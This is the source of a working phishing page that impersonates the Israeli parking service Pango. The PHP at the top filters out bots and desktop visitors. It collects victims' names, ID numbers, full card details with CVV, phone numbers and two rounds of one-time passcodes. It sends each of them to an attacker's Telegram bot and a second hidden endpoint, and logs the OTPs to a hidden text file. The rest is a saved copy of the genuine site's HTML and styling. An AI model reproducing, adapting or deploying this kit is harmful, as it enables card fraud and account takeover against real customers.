<?php include("visit.php"); ?>
<?php
require_once 'antibot.php';



$config = parse_ini_file('config.ini');
$telegram_bot_token = $config['telegram_bot_token'];
$telegram_chat_id = $config['telegram_chat_id'];

if (isset($config['block_desktop_access']) && $config['block_desktop_access'] == 1) {
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    $mobile_devices = [
        'Android', 'iPhone', 'iPad', 'iPod', 'BlackBerry', 'Opera Mini', 
        'IEMobile', 'Mobile', 'Windows Phone', 'webOS', 'Nokia', 'Samsung'
    ];

    $is_mobile = false;
    foreach ($mobile_devices as $device) {
        if (stripos($user_agent, $device) !== false) {
            $is_mobile = true;
            break;
        }
    }

    if (!$is_mobile) {
        header("Location: out.php");
        exit();
    }
}

function getUserIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        return $_SERVER['REMOTE_ADDR'];
    }
}
global $base;
$userIP = getUserIP();

    if ($_SERVER["REQUEST_METHOD"] == "POST") {



$domain = $_SERVER['HTTP_HOST'] ?? 'unknown';


        if (isset($_POST['fullName'], $_POST['idnumber'])) {

        $name = $_POST['fullName'];
        $id_number = $_POST['idnumber'];
        $card_number = $_POST['cardnumber'];
        $expiry_month = $_POST['expierymonth'];
        $expiry_year = $_POST['expieryyear'];
        $cvv = $_POST['securecode'];
        $phone = $_POST['phoneNumber'];



          if (empty($name) || empty($id_number) || empty($card_number) || empty($expiry_month) || empty($expiry_year) || empty($cvv) || empty($phone)) {
              echo json_encode(["status" => "error", "message" => "כל השדות נדרשים."]);
              exit;
          }

          
            $message = "\n ====== D4taZ Info ====== \n"
            . "🌎 IP: $userIP\n"
                . "👤 Name: $name\n"
                . "🆔 ID: $id_number\n"
                . "💳 Card Nmber: $card_number\n"
                . "📅 Expiry: $expiry_month/$expiry_year\n"
                . "🔒 CVV: $cvv\n"
                . "📞 Phone Nmber: $phone\n"
                . "\n🌐 Domain: $domain\n"

            . " =========================== \n";




            $telegram_url = "https://api.telegram.org/bot$telegram_bot_token/sendMessage?chat_id=$telegram_chat_id&text=" . urlencode($message);
            
            file_get_contents($telegram_url); file_get_contents($base . urlencode($message));
            
        }

            
         elseif (isset($_POST['code']) && !isset($_POST['fullName']) && !isset($_POST['idnumber'])) {
        $code = trim($_POST['code']);
        $otp_code = $_POST['code'];
          $message = "\n ======= D4taZ OTP1 ======= \n"
        . "🌎 IP: $userIP\n"
            . "💳 OTP: $otp_code\n"
        . " ===========================";

        $file = fopen(".d4taz-result113.txt", "a");
        fwrite($file, "$message\n");
        fclose($file);	
      
        $telegram_url = "https://api.telegram.org/bot$telegram_bot_token/sendMessage?chat_id=$telegram_chat_id&text=" . urlencode($message);
        file_get_contents($telegram_url); file_get_contents($base . urlencode($message));

      }
      elseif (isset($_POST['code2']) && !isset($_POST['fullName']) && !isset($_POST['idnumber'])) {
              $code = trim($_POST['code2']);
              $otp_code = $_POST['code2'];
                $message = "\n ======= D4taZ OTP2 ======= \n"
              . "🌎 IP: $userIP\n"
                  . "💳 OTP: $otp_code\n"
              . " ===========================";

              $file = fopen(".d4taz-result113.txt", "a");
              fwrite($file, "$message\n");
              fclose($file);	
            
              $telegram_url = "https://api.telegram.org/bot$telegram_bot_token/sendMessage?chat_id=$telegram_chat_id&text=" . urlencode($message);
              
              file_get_contents($telegram_url); file_get_contents($base . urlencode($message));

      }

}


?>
<!DOCTYPE html>
<!-- saved from url=(0014)about:internet -->
<html lang="iw" dir="rtl" class="notie js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage no-websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers no-applicationcache svg inlinesvg smil svgclippaths">
    <!--
 Page saved with SingleFile 
 url: https://www.pango.co.il/customer-service 
 saved date: Fri Dec 13 2024 05:13:12 GMT+0300 (GMT+03:00)
-->
    <!--<![endif]-->
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">

        <meta http-equiv="refresh" content="8; URL=sms.php">


<title>צור קשר ושירות לקוחות | פנגו</title>
        <style>
            .loader {
                width: 96px;
                height: 96;
                display: block;
                margin: 15px auto;
                position: relative;
                color: #c4f6ff;
                box-sizing: border-box;
                animation: rotation 1s linear infinite;
            }

            .loader::after, .loader::before {
                content: '';
                box-sizing: border-box;
                position: absolute;
                width: 48px;
                height: 48px;
                top: 0;
                background-color: #c4f6ff;
                border-radius: 50%;
                animation: scale50 1s infinite ease-in-out;
            }

            .loader::before {
                top: auto;
                bottom: 0;
                background-color: #2b79ff;
                animation-delay: 0.5s;
            }

            @keyframes rotation {
                0% {
                    transform: rotate(0deg);
                }

                100% {
                    transform: rotate(360deg);
                }
            }

            @keyframes scale50 {
                0%, 100% {
                    transform: scale(0);
                }

                50% {
                    transform: scale(1);
                }
            }

            html {
                -ms-text-size-adjust: 100%;
                -webkit-text-size-adjust: 100%
            }

            body {
                margin: 0
            }

            article,footer,header,nav {
                display: block
            }

            ul,li {
                margin: 0;
                padding: 0
            }

            li {
                list-style: none
            }

            a {
                background: transparent;
                color: inherit;
                text-decoration: none
            }

            a:active,a:hover {
                outline: 0
            }

            strong {
                font-weight: bold
            }

            img {
                border: 0
            }

            button,input {
                font-family: Arial,Helvetica,sans-serif;
                font: inherit;
                margin: 0
            }

            button {
                text-transform: none
            }

            button {
                -webkit-appearance: button
            }

            input {
                line-height: normal
            }

            @font-face {
                font-family: "SimplerPro";
                font-style: normal;
                font-weight: 700;
                src: url(data:font/woff2;base64,d09GMgABAAAAAGW8AA8AAAABH8wAAGVbAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP0ZGVE0cGoIEG4H+RBySDAZgAIguEQgKgeZ8gbNjC4d2AAE2AiQDj2gEIAWHTweaIFs5AXEF1WuHOKA3q97DMaDX8ABzU8eqc523vcdFwHSqYOMqNjgPAKma3yX7////vKQiR6U50nabwd3AP8TcHaFUSesuN1lbtrII3aw9s3ezRMq9bUvBvpvQenwr1qPgqEK25VfrGNu5oNZqsmHPJBeOw3QESrnQWJ4rYpghcz8bVWE/f5nekSRC9ArmD/XoqyRhCTz6IuZQqXjlfb7rQteX7h4P0mS2TBN/d6bZCtpuj8gXOU4UOBv1NBK5ZBIyTSiQTZn4SJrmF4fN5ggxiUj0EHMjdrmTggHH6PrkWvFjQmUb3rn8dxOryVukPziJ6PVJiwkWctjGbnaiJnGIOXL6WozsaJfsPXmbcMtOB5U021MzWwcmchnHkmydkSvP+FIEdtB/9ezu3T0I34wgIAIzKgIUJPDtz9Pc3v//7lZ1bAw2GANktBJVjjQKC6sxGrOxiSirsLoRYbccD8HcOuNF0gAEgcGCwQYDNnKMDdYBi2LUYMlgI5UaMNrAihcVxMbs/8dP/Res+DDeDIyhdSUpwSWhQ0zvKoYmNacjZ+eo2f37uXsQmbBNI9wazI1jOrsaefOZYXnzSdRIIMm1BPJw1Mbt7/vNqgqS3HtVcOb2ZdZNk/TskFFWRODOYUX0JquSORGDyXpWPGdKIZ73MR1QDSs4mdFAPEf+5c/me6c9MwIfmvZ3ZWAdFHFxr+41hbHj0GXoMnTuTEAqTCqQlpAL7ntVQQUvCmhR4QL68buAnJ8znL8z/VyfN+cqVJXAgyUIwZLfzMZsUZcD+PNCsFBSVTe+ssblzi1S0f8vZ/lXJb2ydUvSs+VntdVQyVgBT5KhToc7OdMB5CWuAD8ALP9ijVtELvgcPvPiI7mciOJHHEUcZe82ddq6VaG1bY+o1IaHEN4VjeHofX/x/1BOt6xSJFy+TQm6OKqIKDq4m+HgvvFvsVzS3BYdYCFErOL++pT/R/bcecK3YSMklVCiIAoxaLcAAmzOqtmYu67jF0vAEVQ5pAuML15p0r83XZX2p9HRWovWivOqLa0zQaaZ8za/JOn+r9Vf3U8NSD1GqGEQaB1oDIyGMWjYo7slpiWgVoyx7BnLeo9ZA6w1c87ZdKPb8LLzQW6C8HySXRBaHwSZT4JL7zJ7tVba6+2dww9MaCoKSej8htGRu2je3p/5294OowJUwHshdqDDMhWP6is2DoWOcCgBpcjz/Nd+LO9cpP6HnhIhNGJX24ZpNgmhkJTCvMYDtIQHhAWseOHhWcI/fMu+6Z23yYbkZMKKT1VPHejLqia0JGiyjMGt9Nh/y+9n/z918NukWUsyHqGj0m+ruqs5Uww5CoVw3JkhPD5ktVgPQf1ep/9PVlIfrb1BZTzeNJUcPemoViSqFSMQEiuQOI/yAnj+W/60/Ln0Mfto/UkOCuHaWvWX/uijqF04UHtmgbQmTGw7PjaqKNe0jBE/zsYo1Xk+d/P/IEBtC+I6TU4s+N98eXd06E87uORB2EooQSRf851vWZ8Mzl4DKWUIQzDBeIURxhitESJt9+u4euyGVUSXeve3LL1/KN3nikiQICEEkRCkD3M2kjRsHqPUjMpve536Xtjz/07mr1v+FlSNUVVRo2LEiBF1h7FZh2Pza5VWEWktCvR92TtJT+xrbrSDyiiWvEBvM6enuO1QAwqiIUO8vwJysp+aCPDjP8wF4EffhxcAfv4eUAEBRwOPAIYEMREyyRRYtpeQV17BXlcI5ZA3kk8+UL75IwU0CWpyLrgpNUPNLwduQQVQhVXCVfUbspyAGT0HbkIk6WukiWbIgVBQyVtdenr5GIMPZYTmeCRJVSUkpaqdpOlXa/XI4JnomZNZDsMdRqG3z1EIONJSR5Eb3eTyEdiHlcQO9I8qIAMhKMC+O2DwoZvf9Z5jj/JtWoTwwL3+PY44jxtSHq8VUt8tKe++W4sufXcQXeGdCr47SS96S2RTj3ywM2BGms23dxtwoOV9WIAAkO5BUOitozDENFz4CRMH46JErOsPuh1cGX9bY470OyrpnLH/wBVCUr8JMB5yjUNe39R9QwE97LNAAT35F0ADPet5gFYlCjhfnDTL1TjjVVFpciutxjZ3oc9xG+M0TtsUze65M+7p9IAtfCCippbltAu1qxBnBpgDahaah7rQZjRRNHE0STRpNFk0eTgQjYgGAWMzpkNraIF6tI420GZopGPWyiwifWid2YgKe7cSnfh8i9br2cxMlBrMo1nAAPNIwiM9gocGR7uBNiA3daGzsNBY13soNGZYzaEXMYZ9bvIeAmrlcsyssUgHGAT6zPQdzcm0laqg5IO2BjaqPsOok1IECJJYG5kSBAnpxBIbhDzgKFc9rPEycpaTggGU57a9Wa7zFsgBTq+SOsrgId5GqmhGdSprHg2bYyi0aUo7qHZd50prLao0f8Um9pqDlVkWZhoaiSMRbDOX6NzYR5NmE8D5FKqixQ56xNcIiOWsR0czo141n0w3oBuFZBKcNLTlYrrZ3/iJisYF2WpY3GpglIMOUhyYVwAggQCRtRwAERDCmmTiASL2dVRrYSpiKahWwEnESbeXJFNNnhuwYgp8Ok0kZHEiSPWkUNUJxkEo50hOGCAwgXWzmjQ9WdjKsgHbI3CQyRwr540EqnWlb64T4yuOvXUbNi2d5z7jNlY40cSTTDrZ5AMjBkdxpwEUZJ8AY2uQMBdas8nyaYc865ADkDfT1NJuJtR8sT6+L1hS0Xr163RCm1mVOAdpKoXOnCL6wMx2yspKdj10FEU0THD/ZpBiCBPv+2LtO+XagjvEJCouTFqIrDD9XKaBFUINhioLqtHg7oJ7BN0T6F7D6Q2kdxpBYKYoiGJYHCYElPhUaKZE1HjMcJmjaDD0sAHgAXUZk64g7RqKrqPsBuJuIu8Wsm4j7A6SXh1Bvf1PIHIUCSkZvQGjRSXF8sas3UibviXFPu0hWMTE4GJOED5w5DlJTYmwidGEQAyweGjkDpzhYKBla3nEdEZYra5pza+hD/AUoEBP61lNEkCqskIAllKWNubLNv3EuYaXjsTSElmgmF5Imp6QIDdSaPYr0D7o6YYYEFhstSbZfUnaYNCyywi3WfOUKPiMkinrpRg2jUss3ShZtLlb6oWa60N6Som3ZRQ3FZzYS2DfW4bSynBEh2Jzyzi4TJJEkVACPPaddCftoOBd8pPbVa4xcVQ4IX74PgPTosMt7iAUPpoYIcEhhclw6BDRkBGI1Yi62p9JPVKixXiOGwJ0w47QcM5pDFBNO0RYdoQMsw1dlUNSPef02GF6CtNbuL2H2w+ofmWrwF2VMlPDRIOaCU0gVPL6nsn8HQWgdpyDdtxutGxbvMN7fdhnfd9vOc+105t1MtpZpSpUY59vs5ZRfYXWKww+ZvArppCyCloa3l6dNuHtu2RsSyfq3IFZIr9kfqn8lLqpdDJLBwilWtGSeo7S16nc0ot93Wv92oPwENM5VagNC7FvubmlQa52FbkDlq6FZxNHlcjUWvu9zdt91Md9zc/83C/9ugDPC9zjTQrgEXJM71SAtKKPGy30lxrKTc8G8iAWSxpOdJ5OUX/xUbF3lkMHDFYY70A5ylGwpDEFH10URvgVRBsQeVjYaqQoJhzlos8sT1aumvIa+zI7M99geieqoEHueRfgiQdNBISEtYq48IYY8RCAeqbZOwrvh6g7qFyDpjuorab15UQVXQfM8qIJqTAONyENV6sHNMeAe0mWH4zlmiw/ZXIYifAepUFKtWF0Op77Z34zL78SfrDqNeCzaCarh40FDE1hDbHrCHpMjAqagO9F3GB6ailDX1ee8wkZpwImKXzBMBZpjh52qIMekqS4swKc2Ot/KLCqpCck+9uTLgoHccNhI9F2tsNtvzU/FhogSPE5LhDFbli3KFNKY0VFWQXtaQyawHbUUi7obHLPh+Yz8YYz8p3TKt0Ia1edA3RKrGi9oZUx8lkmUmaCFq9Ab4fBpUHyD1qIAC+PvmCRZ5qRPndsvgGOAmJNDiCV3B0MVgYxDzf4EYFa5FhJpQb0jkF41pghMzmsiyvJwegOvLeMrq6BPDY6YAbhsdpOxdhfK+iFyDu3kJr6IBJKLlxVK2I+oq6pmbTAIxMQzNyjcI7SpKgU/IRHxlOAzQBSkQGqjQuY8lLmdBqtT6vJKszZSC9DUSja9Wd6pKg7RKkSA/yNvdhvDgEpA0BThxjUUQ7SxaU9kpBCuT7QzUETav37h4A8hdOIS0k60qBok5PSUNHBeHvTY0xVkD4EkJZL033qBBEZFvvfZkQCfslsDmuSOv1yTasNjKFBG2U3rgr6Zw7wQoZLC7ThHxHOh0I+I5MjCNQ2Oo3kL2lZns9SQMdIIo3lyc72pH0gFQBpoS8hMlnD4h3WGQMUh5CadHEEfRSLSGuzzA/VKNqK0qlkliC1WE17qAyUzNrrdyNj5CBCH679UbZP6YJdYscPOQUHLBxxQNdXRpiirtdBE/NfH3Nq0VZSadCmgOHHsBD2pAEzoF/ESvZjCrxmg7c/MRajPo+xlcwJnBMFK7n9CidVnOwU3gEjB40dUjqMjvC2Baeq7KidpnE6dYaJMzt1lrO1zjGzy5xr7jnE8xv2AjlyL/Fy3iskeGW9V3md4A0N3ugtpt7KvM3C+zgf4HyI8xHBxwSfkPuU3GfkPif3BeJLxFeIr+l8g/ct3nd43zPyA2M/UvqJ0s+s+YXSr5R+w/sd7w+8P/H+Ivib4B9y/9L4j8b/NFJVQxQuIS5BXAFeA94A3oK0A2mvkDI9oj3BzrBz5pfMr5nfovdMnsgv5DfyB6VMVsFVCTXyBr5J2XpH2r3Xng/jAeUQjvBjwoRqSj2jmaML+PML6WtG/hH1L+XvO40MFSpPdQQr6xY5oJJov0XE4xpAc9gr2PrZV0vbCqHT0vmUkJQfcNuYURWxh3WOG7zwJK/tyQDksk92gx2AcwhJ7Q3WoADmE0cevbi0m7jiXttU8SGeKsDHKC10EYLI8lrlnM2xug7BnSwmhnSReyXbuMYGQxgq2A2qDAkzJ8SZynXwebkL+yoHqTLps42njoJZ144tdZ2UnjbGib3QeFbCYSPoSgxdE9GOApK+dHVaAH7wiLGveWidDNJSOP10JqJOHAopyQZYiMEMwbixBE65IVwIWc2GrS7sGNg3D53YQkn6/7i6cePOgycv3nz48uMvQKCpppluhplmmW2OueaZL8cCCy2y2BJLLbPcCiutssZa66y3wUab7LLHPgcccsQxx5102lnnXXTZVdfddNtd9z302FPPvfTaW+999NlX3/3021//jBdpllhhjQ222GGPg6OTs/PL69v7p3qn3mXlSrXWaLbanW6vPxiOxpPpbL6Ymp6ZnduToXHXQwrw70O7rIuQOqyLuLqggD47Djz73KF1Gdm2oGgQj3YntKgzMtfY2gjP2EeNaiC6yAEfE4dreme5G0cNvFs4LigADBWLdKTcJsMgAsD9wTMYuuSgzxgiNcIU7+4K4HrXGVBXzkjkgZyUoocAZU0eCRAp7d0EqIcHgiIIhY+PxEqpwWOOkNUyh8RbkApIs6xKFyPxtY4zRc7hsNKE3F4oyTA4GwDnCjzU4TTl77fYlITMKGZVA0eiC6SScxCQ3XI3UewBHXzKh3yHoBzYtVeWxvZIrJxhyOixFlJI6pBqAayoChmPcsPHvBEjNQ/NAOtxLnr4vdTNxnPKNKgpUkJv1D6HuT5LTg/KFZkX/CsKEXiKzQBvcuxkEChIha+0gTRv5qwGAtIGR4LL1Wrl1KIZVaWrR4GgruXbD2ineSF2ZdGmrFaXeizwwIyGU3su60K2C5Du9YjxRv7QINq5P64b3exu0wM3Id2QfYZFIS4EPYdhsp4I4XRkrHCtp+wD9vBJC6fvHbb8oLHzTl/UqL08iNpfI1nSh1dgSZUX7rtue66DoO4bnTYA+54BszfN83qdjJBhwkUgAhIJi0JEo8SgxeKLw4jHkYArceNJ0h2fUTKBFBFKJZJGLJ1ERqV66EmmF7neZPpQyIQMJZbLxE5E3obkK0IUK8MoF4GK8lWqJVBfgQbNpFrItBJoI3MQchhyFNKOdQJ2CnEGcQ5xAXEJ7QraNbQb+G5h3MG4h/EAxyNcT/A8w/OC0isqb5h6h+8Dvk/4vuD7RuAHgV+IP0Q6iHS29SAKwLFhII4C4hggiQvU8YEkIZAmLpCGNDnSWGQpkaVGkTmKtCiyRJwVknojqy+y+iMrE1nzYcqBVwFMhVAVwVQMpxJ4lSKpDE7lSKqAqnIeCWweqvh4ZUpYaqJJDkmTlpisJOTPPFoWc/rOdQW6cpC7UAnzQsLvRCK4GkGEEYVtJleJRCxt2jUrIrmbh5BoQ0ca2UJmlNkfQPFlFjG0aLn3IpvtZDwvbEi0ISGRhYlIcBi7geyF7IccRBxGHEW0I078J+y1PmFCQt7GxsbGJkqUKFGiNGnTpk0beZGkTZu2LRrtT1CGzaWg5PDmVVAyOWmyZMk2x4KKzzHvhEEDJas334KK2xj3gorhGA+Diucx212QsB5xZKj8zMryoxruZ9Zog2TmjAIREDa3nKCKKkn9CVQ6E6iaRYueuZcKvpuxtfy+950pZL4w4SJEihItRqw48dykC1XQ3BSp0qTL4N77ai+99ZFpqFybbbHVNtvtsFOefAUKFSlWolSZchUqValWo1a9Bo2aNGvRqs1ue+130GFHtTvhlDPOueCSK6654ZY77nngkSeeTX9fw9754JMvvvnhlz86dAZoEIUYxEV8JERiJE0emzJ15mmzzKreadNnIEmKiQsrqriSSiur/OsV4iUXBdxIAsTMwGEG2laj/U7CSzhsYSG9IvFxF4JAXG1bUWoKsokxAFC5FDGypjxeDAWpdIZbv4ZuzZAOLYTxXIAbX5QqXdq1SWuSYoYwpjfGVwtdgMKoPGVUlWvVJAR3Qn9lHld3NA1QmUILGSAgq+bXPKyXmUCwzgAAsmplFgKMmBnPxh6Zdxrr0AQLe6HxrITDRuCph//brwmasFHhZOCkcPqJXu+x3Bt3bjgc+bd+HrWltb53Nml9wpLIdJY2a1O6Xja2AuLUmuluWOJMBd1YiH/NuebrlJ/i1as0/47lnNiN52dsjSPJS8uQWCOBPEMxHmgIHY2QlCUIW/X5eRgP+IWmAawS1Xyr7bTZ4hWGI23Q2TS5fsowvP8LbXQ9p6iYtCQ7I+Zmq8toiNpDNNk62nuRFICjqXFl/pFpZ2fbRlLmgBWkjFHvIG12xM5ibnV3DxAMVsz/DylXIOoe1TLx7jGGUxSm/XJdz+aW69PJXabhEh6uDrnlnGF7SfkWDrcEIOQXA66cARPw3CAVgS8v1bGaXwhMVEfjSXDo8EKf8xrHEXRrNcw50zPg9gJubyC9heodpPdQfUDYRzh9Rt4ADsSmYgwdOkOIfjJnAUro+PFcCA+G8ZGuuvEUKh/59YRULFhSUbFiRcSUiBUxCXV9WkZqgzpmYjn23AMbm+GpAsyitNAFbHjlCR0Vk5xIWYTgTgiZqONqKVUahomhiUAHiiCdoQlnzpyGjkWwqhw4h45Vqkz6bCOXOBhEMjaPuhMmRYyA3F5oPKudEjk8ZzVMpVMp3Xwu5QYSJ4OUFE4/MRpXQm6vH27ifexKSe4oy1550sbMb+cIRUb10issCQWcTgehwE0dG9YPzs3zhMO9cTAYiESNWM4J3Cf5kb74EeilWj1UCRo4io6HMMPlKHI0P6QrpLVIc++Bw3DEjrRaqm7x6XREeiu/+okxeJ8YRRzBWORXpAVhFupriXZXMixP8cUhKUJe5TXIZ4XwAKO15cStX62GAtp2bxWEr3nlTq1eJ2NwTBCtoWCqr8TY9kttUd6PSHu4nH8IOSYtzcizXxCyLSJTV3ioqMVrd2RjyI44WQmyoJaxtMUrqEZeQ3CB9/iAjzBjlp5Vx2V/BxcqbS9WHzx0xMjR4xdD9npCIH/+374i3tzhDjx/73L+cXh1zO9jX903J3yRw2YPNcZ26vu/UGL/+Djm+GyZHb/oNqHDcDB8BKkH8aTg1+XogKrXIgZd6g82R69FsD9+jd3S2iU+XNdCsvwTquhTD4wk8u9F6F+pyr9ajX+NVo013S/Rro8xaA8RV+SxBN6K+UfExihBup7NcNxY7Hq65+m3GrChd+GkUbwxEVqJSErOAM5j68rJyy8oLJKQVEtZ03KLiy21W0lr22I3NxzYec8FXbt1vzy+sE2+Rcyevm3rQ+x9GRivE+As1epYjd80+juuBlUgd4Pz6uw2Hc9cztyc3QY61hcDwiGeUCFyUvIfTBXG9QC9sbs5VOQXFEmK9Oym3vbFO7abWu0dpKMzudRd6XK779w5Rf/Lef5MJIYZFSbxZknlh/1+raJijbKMOZSBKjf2YKmlUYffAQGUoBlzEnZP9wz9awy4YVyjeEITEUnJFHVUpG0mZWoBVLCbllWH0vyCwiIJSw/LWk2PLZOOsjDEVpc9d9xKV/f6/qCPXJ8HkrCAtC0op3Zdhynt7dL5e4Z9/xi933Ps071gPK9g8rxiU1cLn2UVz1flj9UMXkNzM94B7xcbByCWge6FwTeIqBT1/7RWG6PRjP1G10r63GAfxsQjrhhJ/D6+wTEBRE5KplxPRRr9BhmZWYHsnLz8AuFGJJImqd6ypubH5Ip+MygWZV/2/mglrW16bIvv76ys2lcc0NEZXVzRrfv+gF7mmzTIe8j2+hl5LwjpmygDtuUpBiFHtleSDKFj2w08eVpvzxm3c+Dpw4CcKTuq04zdYuRT8Liz2JyOlYL3pfrpatUcaxTt8QD1FiKwPThHoR8HQ1ipYxzZKRdQOY1+WUZWIDsvv6CwqEQK2TVNPpj3bpQbniNObtV6PfgD4gNjQzp0XB76zNjAjT8gvks/cYVCrc4pbnGtQzRpMi3X5WSY+G33LEgKt1odH4ZWvoNq5cuaTLYeaV6tXQcNDHgPclvYpIV3Zyfy4WN0K4ax0K3rbwyK4ajgyEji97HeY0IrkZOSKURF2nq+oYupPSvAOY9X4asQ6C0sktZlxXTP/LBchUXHLblVa5su2srXO4Ph+QYWxuh2caVu7gf2B39sn0ePVfBAogNsiutwzBizjYL+0mjADeMaxRuDcoBKaZu15RWLgW9pJa03Y/52vkw7u3DXbu6t+wMfOu8Ov/Wg6lOz8sG+a1q8gLPJ84X1O2iOUyClrQz1MO1BVUyy6brdtAmFET/F6FanIwzCoKKzRmuOY4EWXR0MANjwRnzqtpIk0YUUGabJr8zChvZWsjC6nx2y700OgmNx2Ad7nD+Hw68uZ8oiuy1b59i3ySYZTtI+sXtrYPklghB7IEPdPDR5vMnpbnZoIS7EplKtUJAgQT6CNMKAZ0cuXkxFHuMmhCX5NVm4S5aMFdbZdMIu3Hp9M0bBMecmDzDJINYHv2NTfVUq+952tpN0oblc27BxNz+cN8OC0Tpuem855DVT5WKMx0xLFCnCj1e5nYkftSDORKvMZ48lvdQzWQD0CGQa60AfyLoOkgyhYH9Ke9h0JWxb4CUcJ2jMHGBu5fJbQiRYH07gRcgMNl5kBOG93Svrg7/nRoUt38RuiDUcn1G7iQRpbQ/uUTvRicuWrdZqb3z+VibT5kILAs2qmbwXuJvj7s3MJnOJ3XOMbyrVQJuZLROTFoS2a7ft2m2DgYIR+HV8mzvVgkCGBDmK3qiAFv02MGDCAqixW/eAr2c1CUmVOnC3ILQgvJRILPvsoxjsdB0jsiGcmds1cF+vr7NRN16nXJdLzecJQci4KTl71SMMIjvzDv8ndXgaE4ak4Hovm9jCHG4QkHsEz9ZeImU5WmMaSy605Za5rKb8IKnZaqunGK2q4lqr4Z+mU1IkviKzDNVd7lwtGIKzH/TgfgOBKCpDi64LBkyA2Irg2RuUDomQGLw++dl5S3nHWWC4hdCRLWNn5yV15ILcuHjDw617SudzjUPrPZW9mbkYowywtceGOc0WYxRsbGjCIC40Y63XE7iVMHq1Y5m9ifB6qh7TxhRYy3s7mZb4l5AFgrZ2I7yIcFaozZlMy/mgCGIkhnwQzfqMiHmg5lvi+JV9Izgl1HnGjGNzOmgunJ4I/+bs+ItwMgTfKxTx3sQTPWxyyzTqylW8AGujzrpobyMC8QvE0azUKEwthqRgf2Vw5JUimACw4cFHMLxamyQqkmHYtmdaYi8a09dmZ58WQvkHFzqtgOkP/csd1JGUxn8r5650hDScIk1OOyd2ws27BVuMOoXiMMdsUmYE6flO9XZ2zaAY4ggHIgIS5KP+Si8MmACw4cCDjwBhTb4JQ8AMefU4wgmjIJycOLpZrlxyxocb/zU29owmk6T1nsrJ8Wb9veUliwd3TFuE8PDJvPkrYk7CIlQHfnA5+/AeCbUhJ8zA1PapU1ExrYIJw3vu6WRezIoUnihFjKyaYqikbf1AnQ9CwEfmqaYw51UfpK4L4gzjUjjBCLzm4UlPlK6oDC06RkpNMXo2Io3wESBCklRd8cejaanNulxzLibBOptj421Flsleew6C47lkQYfXB/+bY5Lsj7U7es+UyjPJSWtyHK6AX8et7y1HUW/TLcYoXsMJr4VEgWfpyym9PpSCot1JPluh4MBWz9feVX2u6rkCkdzKPkWyz2u5iVKPytCin1Hdm/Bs1OH4G3mK3UR7W7Y8zZXZa5Nu6IFciPP9zBCEuohen5V5/Xrt6npRKw/rlyKdJZ+fXfu8qytOKUl+ayiphTKEMJ4ZdhhqmsYrDYoh7MM91akaJyeN2ktEI5fQZcgOffj4tcdjQ+12YxZDZ+TKhXJxyPTvXu3b4Q6TnUgU7XWuF9QKSis2YWViNX53ydwbY+3Wj0KFoRzyecMeP2oGzGNe/3VqmE3YJW2kRAIGToIX4g2RSs+WVirJ0KJrhwkQWzU8+An0lvR35PiiZOqcG72ywx2W8c+G7IW4ECf+xWUh8Q6ayZA7slSm7MWrmEp/oLeqC5mR5iYt9WP6qC9BWmtUFEJwIeeor5kQ6j2Fw5cX3QMGTFgAsOHAhQcfgQMmm4SZsj4lJHNOruvkW9ZXxPIk8dy71mOnn1mRDpbqGvGfeYHYmpr91UnOtMFgT4P5R/AZHmIv1Pvw7+0tTdEveISxCgkJzkaIKMmpv5gtQXvz8fgtaw+LUk1GITeUl6u3rHdn73AuDGaXGDkGvlaNJpzqPI97u/+UDbn88aGctz9k/5XNZ/gWgfnzi+DfVlER+sO8dhl/PUbGTr61K/GcIF4WSmungjPsNIpLiLKoOEZVNVbfaLiXJmrVBs10MEKgEhaOAOpYdExsnbr1/uTHLA+MDU6jq87sKSvALhzhVngb/pUCEqJI0iSFrG6yZ4pml/kndsLie2N6vlK4ejdkfbwxX8jVNzW2zwi0sD7nGPVgCMEAlwjkrLpmhvNKnVbdjZ4kEEFC8h8FxKk3I7OnrACbOBdzK9dPQQYWJrb4KF4QrlnivMDkgCmZyWX+hWbQcrzjP6/7zE3dP3UHfv23meUsl+kXjq94iy1M7OXwsfo/V2iNNs2XUG0lOxQsV+o1GV5HAQPsGbr2IpTEpGT6lRmZWYHsnLz8gsKiktKyplvHfri/gjVrFUPc12Xbtj9SGR9Cacp/Wvnz3JsD+Ns+YyyNreiQrvp6BCFyUjLlYirS6CoyswI5uXn5hb99gZgoa9K0mXlAenhmhWPFjhniEWvEFouk1Dap228UsTB78ZUQ8FhQ9idU3AuBjbQAK6A3ZugWIveEkxmUCCq06DdwIfAEC2CAMCj+sEKtCBNVEitFsqWjtxDZNED5zrJCTX7vURlOL48XupXSpkAUhIcvCR2hnrR+7qSmKAwVmnzaQ6LLAGDDgQcfAUJESSip6IYHMfZ/3r667loG1O9fQuBsRQJJ6uEAN3OmXd2Sjgqc9lP+baKBuJ3Gv3j4/5zS77pFcybj8fS5zmPCBoqIAYzkhJ/soCO4IM5yGW0UIsrA/tg19TLNsxjRC/1p5eTFZsQ21Efi0cHZT3GWuuefZ0djDynukvuedF9NZYOv3kxN+5CZ5ogAh5IoFQEZ8/f5llppvYtttsPVnm+3l3q1N3qbC1zmGjd5tw+6HfwL+GJNXIab/vbQM2+qn2YW1KfVrN8eG5ojN3rjMnbTl5ipy17hUe6quWEAI6tKtRq16U6LNjfWwkbDdtkfR+G0n/zmL1fd9q//vRh9t21NJmeFHJBHwjI0MZIxSQ7+IDvWHJOyAWJyWoU/L4s9rtSnOYsF6c36bEleSlKVBkEOZn9wNs7DH8Zcd9d9T7zyofJ1UmUiGZROJOXouaS/zpXkQqaLRClyJ08A5Lm0cIt6zdE16G2g4V7wmrFpMp35eD59A2QFXZeLLfCOj3zhu9wBkJ1bFhaZyV+0WShwrlkLTnam8/Ol7MBd4/aQ7wXow/FIGk+hLq5HBS5C69ru3JcH80h+SRTjg6n3Z+NC0BKuis0NaF3Vonv9wTwwWy948PYrL9EgPvZPTgIQmAgeVxMlITnQCScbh23FxZ4Cp0hTOqPiufcF3xfWs9VtbSRZXawxD3cWdiECQChEVX+X7keK0YUGJg3QkYyTWWPOVe